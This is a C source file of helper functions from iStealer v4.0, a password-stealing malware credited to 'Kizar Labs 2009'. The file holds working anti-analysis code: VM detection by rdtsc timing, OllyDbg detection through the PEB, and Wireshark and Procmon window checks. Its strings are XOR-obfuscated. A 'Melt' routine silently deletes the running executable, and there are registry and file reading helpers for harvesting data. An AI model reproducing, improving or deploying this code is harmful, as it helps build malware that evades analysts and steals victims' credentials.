// functions.c - iStealer v4.0 - Kizar Labs 2009
//
//////////////////////////////////////////////////////////////////////

#include "functions.h"

// InVirtualMachine
//
//////////////////////////////////////////////////////////////////////
int InVirtualMachine(void) {
	int tmp;
	__asm{
		try_again:
		rdtsc
		mov ebx, eax
		rdtsc
		sub eax, ebx
		push eax
		cmp eax, 1
		jz try_again
		pop eax
		cmp eax, 0200h
		jb no_vm
		mov tmp, 1
		jmp finish
		no_vm:
		mov tmp, 0
		finish:
	}
	return tmp;
}

// InOllyDbg
//
//////////////////////////////////////////////////////////////////////
int InOllyDbg(void) {
	int tmp;
	__asm{
		mov eax, dword ptr fs:[30h]
		add eax, 68h
		mov eax, dword ptr ds:[EAX]
		cmp eax, 70h
		je _finish
		mov tmp, 0
		jmp finish
		_finish:
		mov tmp, 1
		finish:
	}
	return tmp;
}

// InWireShark
//
//////////////////////////////////////////////////////////////////////
int InWireShark(void) {
	// "gdkWindowToplevel"
	char encryptVar1[] = "\x01\x66\x66\x68\x53\x6C\x6F\x66\x6C\x73\x51\x6E\x72\x6F\x61\x73\x64\x6E";
	UnXor(encryptVar1);
	if (FindWindow(encryptVar1, NULL))
		return 1;
	else
		return 0;
}

// InProcmon
//
//////////////////////////////////////////////////////////////////////
int InProcmon(void) {
	// "PROCMON_WINDOW_CLASS"
	char encryptVar1[] = "\x01\x51\x50\x4C\x47\x48\x4E\x4C\x5C\x53\x4C\x4F\x46\x4C\x53\x5A\x42\x4E\x42\x57\x56";
	UnXor(encryptVar1);
	if (FindWindow(encryptVar1, NULL))
		return 1;
	else
		return 0;
}

// Melt
//
//////////////////////////////////////////////////////////////////////
int Melt(void) {
	char sPath[256], sCmd[256];
	// "/c timeout 5 && del "
	char encryptVar1[] = "\x01\x2E\x61\x23\x70\x6C\x6C\x67\x6C\x71\x71\x21\x37\x23\x22\x23\x21\x66\x66\x68\x25";
	// "cmd"
	char encryptVar2[] = "\x01\x62\x6F\x67";
	UnXor(encryptVar1);
	UnXor(encryptVar2);

	GetModuleFileName(0, sPath, 256);
	GetShortPathName(sPath, sPath, 256);
	strcpy(sCmd, encryptVar1);
	strcat(sCmd, sPath);
	ShellExecute(0, NULL, encryptVar2, sCmd, NULL, SW_HIDE);
	return 1;
}

// Base64Decode
//
//////////////////////////////////////////////////////////////////////
void Base64Decode(int none, char *szInput, char *szOutput) {
	char enc[65] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
	char dec[256];
	unsigned long dwInLen, dwOutLen;
	unsigned int i, j, adjust;

	j = adjust = 0;

	for (i=0; i<256; i++)
		dec[i] = 64;
	for (i=0; i<64; i++)
		dec[enc[i]] = i;

	dwInLen = strlen(szInput);
	if (szInput[dwInLen-1] == 61) {
		adjust++;
		if (szInput[dwInLen-2] == 61) 
			adjust++;
	}
	dwOutLen = (dwInLen * 3) / 4 - adjust;

    for (i=0; i<dwInLen; i+=4) {
		szOutput[j] = (dec[szInput[i]] << 2) + ((dec[szInput[i + 1]] & 0x30) >> 4); j++;
		szOutput[j] = ((dec[szInput[i + 1]] & 0xf) << 4) + ((dec[szInput[i + 2]] & 0x3c) >> 2); j++;
		szOutput[j] = ((dec[szInput[i + 2]] & 0x3) << 6) + dec[szInput[i + 3]]; j++;
	}
	szOutput[dwOutLen] = 0;
}

// ReadFileData
//
//////////////////////////////////////////////////////////////////////
int ReadFileData(char *filePath, char **buffer, DWORD *bufferSize) {
	FILE * hFile;
	DWORD fSize;

	hFile = fopen(filePath, "rb");
	if (hFile == NULL)
		return 0;

	fseek(hFile, 0, SEEK_END);
	fSize = ftell(hFile);
	fseek(hFile, 0, SEEK_SET);
	*buffer = (char *)malloc(fSize);
	if (*buffer == NULL)
		return 0;

	fread(*buffer, fSize, 1, hFile);
	fclose(hFile);
	*bufferSize = fSize;

	return 1;
}

// FileSize
//
//////////////////////////////////////////////////////////////////////
int FileSize(char *filePath) {
	FILE * hFile;
	DWORD fSize;

	hFile = fopen(filePath, "rb");
	if (hFile == NULL)
		return 0;

	fseek(hFile, 0, SEEK_END);
	fSize = ftell(hFile);
	fclose(hFile);

	return fSize;
}

// ReadKeyData
//
//////////////////////////////////////////////////////////////////////
int ReadKeyData(HKEY hKey, char *subKey, char *value, char *buffer) {
	HKEY rKey;
	DWORD lpType=REG_SZ, lpcbData=MAX_PATH;
	char tmp[MAX_PATH];
	if (RegOpenKeyEx(hKey, subKey, 0, KEY_READ, &rKey) == ERROR_SUCCESS) {
		if (RegQueryValueEx(rKey, value, 0, &lpType, (unsigned char *)buffer, &lpcbData) == ERROR_SUCCESS) {
			RegCloseKey(rKey);
			if (lpcbData == 0 || lpcbData == 1)
				return 0;
			else
				return 1;
		} else {
			RegCloseKey(rKey);
			return 0;
		}
	}
	return 0;
}

// FindString
//
//////////////////////////////////////////////////////////////////////
unsigned long FindString(char *buffer, unsigned long bufferlen, char *string, unsigned long start) {
	unsigned long i, stringlen;
	stringlen = strlen(string);
    for (i=start; i<bufferlen-stringlen; i++) { 
        if (memcmp(&buffer[i], string, stringlen) == 0)
			return i; 
    }
    return 0;
}

// GetLine
//
//////////////////////////////////////////////////////////////////////
int GetLine(unsigned long *start, char *buffer, unsigned long bufferlen, char *find, char *output) {
	unsigned long i, b;
	unsigned short findlen = strlen(find);
    for (i=*start; i<bufferlen-findlen; i++) {
        if (memcmp(&buffer[i], find, findlen) == 0) {
			for (b=i; b<bufferlen-2; b++) {
				if (buffer[b] == 0x0D) {
					strncpy(output, &buffer[i+findlen], b-i-findlen);
					output[b-i-findlen] = 0;
					*start = b;
					return 1;
				}
			}
			return 0;
		}
    }
    return 0;
}

// UnXor
//
//////////////////////////////////////////////////////////////////////
char *UnXor(char *string) {
	unsigned long i;
	for (i=0; i<strlen(string)-1; i++)
		string[i] = string[i+1] ^ (char)((i % 5) + 1);
	string[i] = 0;
	return string;
}

// UnXor2
//
//////////////////////////////////////////////////////////////////////
char *UnXor2(char *string) {
	unsigned long i;
	for (i=0; i<strlen(string); i++)
		string[i] ^= (i % 5) + 1;
	return string;
}

// UrlEncode
//
//////////////////////////////////////////////////////////////////////
char *UrlEncode(char *string) {
	unsigned long i;
	unsigned char url[200];
	strcpy(url, string);
	string[0] = 0;
	for (i=0; i<strlen(url); i++) {
		sprintf(string, "%s%%%02X", string, url[i]);
	}
	return string;
}

